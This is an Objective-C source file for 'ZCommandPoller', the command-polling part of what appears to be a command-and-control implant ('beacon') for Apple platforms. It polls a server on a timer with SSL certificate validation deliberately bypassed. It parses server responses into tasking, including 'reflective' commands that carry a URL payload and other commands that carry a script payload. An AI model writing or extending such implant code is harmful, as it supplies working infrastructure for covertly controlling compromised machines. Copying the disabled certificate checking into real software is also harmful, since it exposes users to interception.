#import "ZCommandPoller.h"
#import "ZCommandModel.h"
#import "ZAPIClient.h"

static NSString *const kCommandPollPath = @"/beacon/poll";

@interface ZCommandPoller ()

@property(nonatomic, retain) NSURL *serverURL;
@property(nonatomic, copy) NSString *beaconId;
@property(nonatomic, assign) dispatch_source_t pollTimer;
@property(nonatomic, assign) dispatch_queue_t pollerQueue;
@property(nonatomic, retain) ZAPIClient *apiClient;
@property(nonatomic, assign) BOOL isPolling;

@end

@implementation ZCommandPoller

#pragma mark - Initialization

- (instancetype)initWithServerURL:(NSURL *)serverURL beaconId:(NSString *)beaconId {
    self = [super init];
    if (self) {
        self.serverURL = serverURL;
        self.beaconId = [beaconId copy];
        self.pollInterval = 60.0; // Default to 60 seconds
        self.pollerQueue = dispatch_queue_create("com.zapit.beacon.commandpoller", 0);
        self.isPolling = NO;
        
        // Initialize API client with SSL bypass
        self.apiClient = [[ZAPIClient alloc] initWithServerURL:serverURL];
        self.apiClient.sslBypassEnabled = YES;
    }
    return self;
}

- (void)dealloc {
    [self stopPolling];
    [_serverURL release];
    [_beaconId release];
    [_apiClient release];
    
    if (_pollerQueue) {
        dispatch_release(_pollerQueue);
    }
    
    [super dealloc];
}

#pragma mark - Public Methods

- (void)startPolling {
    if (self.pollTimer) {
        dispatch_source_cancel(self.pollTimer);
        dispatch_release(self.pollTimer);
        self.pollTimer = nil;
    }
    
    // Create and configure timer
    self.pollTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, self.pollerQueue);
    
    uint64_t interval = (uint64_t)(self.pollInterval * NSEC_PER_SEC);
    dispatch_source_set_timer(self.pollTimer, 
                            dispatch_time(DISPATCH_TIME_NOW, interval), 
                            interval, 
                            1 * NSEC_PER_SEC);
    
    ZCommandPoller *blockSelf = self;
    dispatch_source_set_event_handler(self.pollTimer, ^{
        [blockSelf pollForCommands];
    });
    
    dispatch_resume(self.pollTimer);
    
    // Poll immediately
    [self pollNow];
}

- (void)stopPolling {
    if (self.pollTimer) {
        dispatch_source_cancel(self.pollTimer);
        dispatch_release(self.pollTimer);
        self.pollTimer = nil;
    }
}

- (void)pollNow {
    if (self.isPolling) {
        return;
    }
    
    dispatch_async(self.pollerQueue, ^{
        [self pollForCommands];
    });
}

#pragma mark - Private Methods

- (void)pollForCommands {
    if (!self.beaconId || [self.beaconId length] == 0) {
        NSError *error = [NSError errorWithDomain:@"ZCommandPollerErrorDomain"
                                           code:-1
                                       userInfo:@{NSLocalizedDescriptionKey: @"Beacon ID is required"}];
        [self notifyDelegateOfError:error];
        return;
    }
    
    self.isPolling = YES;
    
    // Create poll URL
    NSString *pollURLString = [NSString stringWithFormat:@"%@%@/%@",
                              [self.serverURL absoluteString],
                              kCommandPollPath,
                              self.beaconId];
    NSURL *pollURL = [NSURL URLWithString:pollURLString];
    
    if (!pollURL) {
        NSError *error = [NSError errorWithDomain:@"ZCommandPollerErrorDomain"
                                           code:-2
                                       userInfo:@{NSLocalizedDescriptionKey: @"Invalid poll URL"}];
        [self notifyDelegateOfError:error];
        self.isPolling = NO;
        return;
    }
    
    // Create request
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:pollURL];
    [request setHTTPMethod:@"GET"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Accept"];
    
    // Create semaphore for synchronous operation
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    __block NSData *responseData = nil;
    __block NSHTTPURLResponse *httpResponse = nil;
    __block NSError *connectionError = nil;
    
    // Use NSURLSession with SSL handling
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config
                                                        delegate:(id<NSURLSessionDelegate>)self.apiClient
                                                   delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                          completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        responseData = [data retain];
        httpResponse = [(NSHTTPURLResponse *)response retain];
        connectionError = [error retain];
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    
    // Wait for completion
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    dispatch_release(semaphore);
    
    if (connectionError) {
        [self notifyDelegateOfError:connectionError];
        [responseData release];
        [httpResponse release];
        [connectionError release];
        self.isPolling = NO;
        return;
    }
    
    if (httpResponse.statusCode == 204) {
        // No commands available
        [responseData release];
        [httpResponse release];
        [connectionError release];
        self.isPolling = NO;
        return;
    }
    
    if (httpResponse.statusCode != 200) {
        NSError *error = [NSError errorWithDomain:@"ZCommandPollerErrorDomain"
                                           code:-3
                                       userInfo:@{NSLocalizedDescriptionKey: 
                                                    [NSString stringWithFormat:@"HTTP Error: %ld", (long)httpResponse.statusCode]}];
        [self notifyDelegateOfError:error];
        [responseData release];
        [httpResponse release];
        [connectionError release];
        self.isPolling = NO;
        return;
    }
    
    // Parse response
    NSString *responseString = [[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding];
    [responseData release];
    [httpResponse release];
    [connectionError release];
    
    if (!responseString) {
        NSError *error = [NSError errorWithDomain:@"ZCommandPollerErrorDomain"
                                           code:-4
                                       userInfo:@{NSLocalizedDescriptionKey: @"Invalid response encoding"}];
        [self notifyDelegateOfError:error];
        self.isPolling = NO;
        return;
    }
    
    // Parse protocol message
    NSMutableDictionary *commandDict = [NSMutableDictionary dictionary];
    NSArray *lines = [responseString componentsSeparatedByString:@"\n"];
    [responseString release];
    
    for (NSString *line in lines) {
        NSArray *parts = [line componentsSeparatedByString:@": "];
        if ([parts count] >= 2) {
            NSString *key = [parts objectAtIndex:0];
            NSString *value = [[parts subarrayWithRange:NSMakeRange(1, [parts count] - 1)] 
                             componentsJoinedByString:@": "];
            
            // Skip Type and Version headers
            if (![key isEqualToString:@"Version"] && ![key isEqualToString:@"Type"]) {
                if ([key isEqualToString:@"command"]) {
                    // Extract command type and arguments
                    NSString *commandStr = value;
                    NSRange firstSpace = [commandStr rangeOfString:@" "];
                    
                    if (firstSpace.location != NSNotFound) {
                        // Command has arguments
                        NSString *commandType = [commandStr substringToIndex:firstSpace.location];
                        NSString *args = [commandStr substringFromIndex:firstSpace.location + 1];
                        
                        // Check if this is a reflective command with key=value format
                        if ([commandType isEqualToString:@"reflective"]) {
                            NSArray *keyValuePairs = [args componentsSeparatedByString:@"="];
                            if (keyValuePairs.count == 2) {
                                NSString *paramKey = [keyValuePairs[0] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                                NSString *paramValue = [keyValuePairs[1] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                                
                                [commandDict setObject:commandType forKey:@"command"];
                                [commandDict setObject:@{paramKey: paramValue} forKey:@"payload"];
                            } else {
                                // Handle the case where the URL is provided directly without key=value format
                                [commandDict setObject:commandType forKey:@"command"];
                                [commandDict setObject:@{@"url": args} forKey:@"payload"];
                            }
                        } else {
                            [commandDict setObject:commandType forKey:@"command"];
                            [commandDict setObject:@{@"script": args} forKey:@"payload"];
                        }
                    } else {
                        // Command has no arguments
                        [commandDict setObject:value forKey:key];
                    }
                } else {
                    [commandDict setObject:value forKey:key];
                }
            }
        }
    }
    
    // Create command model
    if ([commandDict count] > 0 && [commandDict objectForKey:@"id"] && [commandDict objectForKey:@"command"]) {
        ZCommandModel *command = [[[ZCommandModel alloc] initWithDictionary:commandDict] autorelease];
        if (command) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self.delegate commandPoller:self didReceiveCommand:command];
            });
        }
    }
    
    self.isPolling = NO;
}

- (void)notifyDelegateOfError:(NSError *)error {
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.delegate commandPoller:self didFailWithError:error];
    });
}

@end 